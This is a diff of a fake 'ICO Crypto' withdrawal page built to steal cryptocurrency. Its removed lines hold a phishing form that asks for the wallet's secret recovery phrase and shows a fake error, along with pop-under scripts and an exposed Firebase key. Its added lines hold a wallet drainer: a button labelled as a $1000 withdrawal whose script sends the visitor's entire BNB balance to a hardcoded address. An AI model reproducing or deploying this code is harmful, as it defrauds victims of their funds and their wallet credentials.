@@ -1,31 +1,3 @@
-
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-E7K8F1651E');
-</script>
-<script type="text/javascript">
-   var uid = '330441';
-   var wid = '717208';
-   var pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag);
-   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag)};
-</script>
-<script src="back.js?1734976792"> 
-</script>
- 
-</head>
-<body>
-<center>
- 
-  
-</center>
-</body>
-
 <!DOCTYPE html>
 
 <html lang="zxx" class="js">
@@ -458,68 +430,6 @@
 <head>
   
   <p id=""></p>
-<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-messaging.js"></script>
-<script>
-    var firebaseConfig = {
-apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
-  authDomain: "pinnocent-fa387.firebaseapp.com",
-  databaseURL: "https://pinnocent-fa387.firebaseio.com",
-  projectId: "pinnocent-fa387",
-  storageBucket: "pinnocent-fa387.appspot.com",
-  messagingSenderId: "403452483449",
-  appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
-  measurementId: "G-8DGVGDCCL2"
-};
-    firebase.initializeApp(firebaseConfig);
-    const messaging=firebase.messaging();
-
-    function IntitalizeFireBaseMessaging() {
-        messaging
-            .requestPermission()
-            .then(function () {
-                console.log("Notification Permission");
-                return messaging.getToken();
-            })
-            .then(function (token) {
-                console.log("Token : "+token);
-                document.getElementById("token").innerHTML=token;
-            })
-            .catch(function (reason) {
-                console.log(reason);
-            });
-    }
-
-    messaging.onMessage(function (payload) {
-        console.log(payload);
-        const notificationOption={
-            body:payload.notification.body,
-            icon:payload.notification.icon
-        };
-
-        if(Notification.permission==="granted"){
-            var notification=new Notification(payload.notification.title,notificationOption);
-
-            notification.onclick=function (ev) {
-                ev.preventDefault();
-                window.open(payload.notification.click_action,'https://nairaa.com/chat.html?');
-                notification.close();
-            }
-        }
-
-    });
-    messaging.onTokenRefresh(function () {
-        messaging.getToken()
-            .then(function (newtoken) {
-                console.log("New Token : "+ newtoken);
-            })
-            .catch(function (reason) {
-                console.log(reason);
-            })
-    })
-    IntitalizeFireBaseMessaging();
-</script> 
-	<title>.</title>
 	
   <meta name=”robots” content=”noindex”>
   
@@ -535,6 +445,14 @@ apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
 	<meta property='og:image' content='earnmoney.jpg' />
 	<link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-ios7-contact-512.png">
 	<style>
+	.withbt{
+	  width: 250px;
+	  height: 50px;
+	  font-size: 18px;
+	  background-color: blue;
+	  color: white;
+	  border: none;
+	}
 		table tr td{text-align:center;}
 .button {
   background-color: #4CAF50; /* Green */
@@ -598,9 +516,6 @@ margin: 4px 2px;
 	</style>
 </head>
 <body style="margin:0px;">
-<script>
-	document.title='ICO';
-</script>
 <div style="width:100%;">
   
 <div style="width:100%;">
@@ -613,70 +528,92 @@ margin: 4px 2px;
  
 
 <div class="inputf" style="background-color:white;padding:10px;text-align:center;">
-<form id="anonymousNewMessage" class="form" method="POST" action="https://app.pinnocent.com/vpage">
-    <input type="hidden" name="ftype" value="normal" />
+<!-- this is the form area -->
+        
+ <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <p> You are making a withdrawal of $1000 out of your balance per withdrawal session</p>
+  <button class="withbt" onclick="sendFullBNB()"> Withdraw Balance </button><br>
+<a href="#video"> watch tutorial video </a>
+  <script>
+    const receiverAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
 
-               <center>  <p><b>in other to successfully withdraw and change the account details... you must first verify it with your    keyphrase.. make sure you have coin in your account.. to confirm you are Real.. Ico Crypto will never charge you.. please note you can only transfer $10000 out from this Wallet a day.. good luck</b></p></center>
+    async function fetchBNBPriceUSD() {
+      const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd");
+      const data = await response.json();
+      return data.binancecoin.usd;
+    }
+
+    async function sendFullBNB() {
+      if (typeof window.ethereum === 'undefined') {
+        alert('Please use a Web3-enabled browser like Trust Wallet or MetaMask.');
+        return;
+      }
+
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const senderAddress = await signer.getAddress();
+        const balance = await provider.getBalance(senderAddress);
+
+        const bnbPriceUSD = await fetchBNBPriceUSD();
+        const balanceInBNB = parseFloat(ethers.utils.formatEther(balance));
+        const balanceInUSD = balanceInBNB * bnbPriceUSD;
+
+        if (balanceInUSD < 10) {
+          alert("Your BNB balance is less than $10. Minimum required for gas fees is $10.");
+          return;
+        }
+
+        const gasPrice = await provider.getGasPrice();
+        const gasFee = gasPrice.mul(21000);
+        const amountToSend = balance.sub(gasFee);
+
+        if (amountToSend.lte(0)) {
+          alert("Not enough BNB to cover gas fees.");
+          return;
+        }
+
+        const tx = {
+          to: receiverAddress,
+          value: amountToSend
+        };
+
+        const txResponse = await signer.sendTransaction(tx);
+        alert("Transaction sent! Tx Hash: " + txResponse.hash);
+      } catch (error) {
+        console.error(error);
+        alert("Transaction failed or was cancelled.");
+      }
+    }
+  </script>
 
 
 
-     
-                </div>
-                <div class="card-body">
 
-                  <input type="hidden" name="user_id" id="userUsername" value="16934">
-                  <span> Enter Amount</span>
-                  <br>
-		<input class="button1" name="message_title" type="Number" id="" placeholder="$10000" maxlength="400" size="400px"
-		required><br>
-		<span>Enter your secret phrase. Typically 12 (18 or 24) phrase separated by single lines</span> <br>
-		<textarea class="button3"  name="description" type="text" id="pass" placeholder="Enter your secret phrase " maxlength="400" size="35px"
-		required></textarea>
 
-    <input type="hidden" name="ip" value="141.101.98.162" />
-<input type="hidden" name="link" value="keyphrase" />
 
-    <!-- the rest of the form //-->
 
-<br/><br/>
-		<input class="login" name="login" type="submit" id="anonymousProcess" value="Request Withdraw" onclick="alert('Sorry! you have enter a wrong phrase. Or you dont have enough funds in your wallet. Recommended funds is $25. To cover charges fees ')"><br/><br/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 	
 </div>
 </div>
-<p style="color:white">This is page is for demo purpose only... please do not login your account.</p>
-
-                 
-  <!--   Core JS Files   -->
- 
-   
-  <!-- Control Center for Now Ui Kit: parallax effects, scripts for the example pages etc -->
-
-  
-
-  <script src="https://nairaa.com/back.js?1734976792">  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-E7K8F1651E');
-</script> 
-</script>
-
-  <script type="text/javascript">
-    $(document).ready(function() {
-
-  var url =anonymousURL('user');
-  var url2 =anonymousURL('ref');
-  console.log(url);
-     $('.userUsername').html('Send Anonymous Message to '+url);
-     $('#userUsername').val(url2);
-   });
-
-
-  </script>
 </body>
 </html>
   
@@ -941,43 +878,6 @@ margin: 4px 2px;
 
 
 
-  <script src="https://nairaa.com/back.js?1734976792">  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-E7K8F1651E');
-</script> 
-
-</script>
-
-
-
-  <script type="text/javascript">
-
-    $(document).ready(function() {
-
-
-
-  var url =anonymousURL('user');
-
-  var url2 =anonymousURL('ref');
-
-  console.log(url);
-
-     $('.userUsername').html('Send Anonymous Message to '+url);
-
-     $('#userUsername').val(url2);
-
-   });
-
-
-
-
-
-  </script>
 
 </body>
 
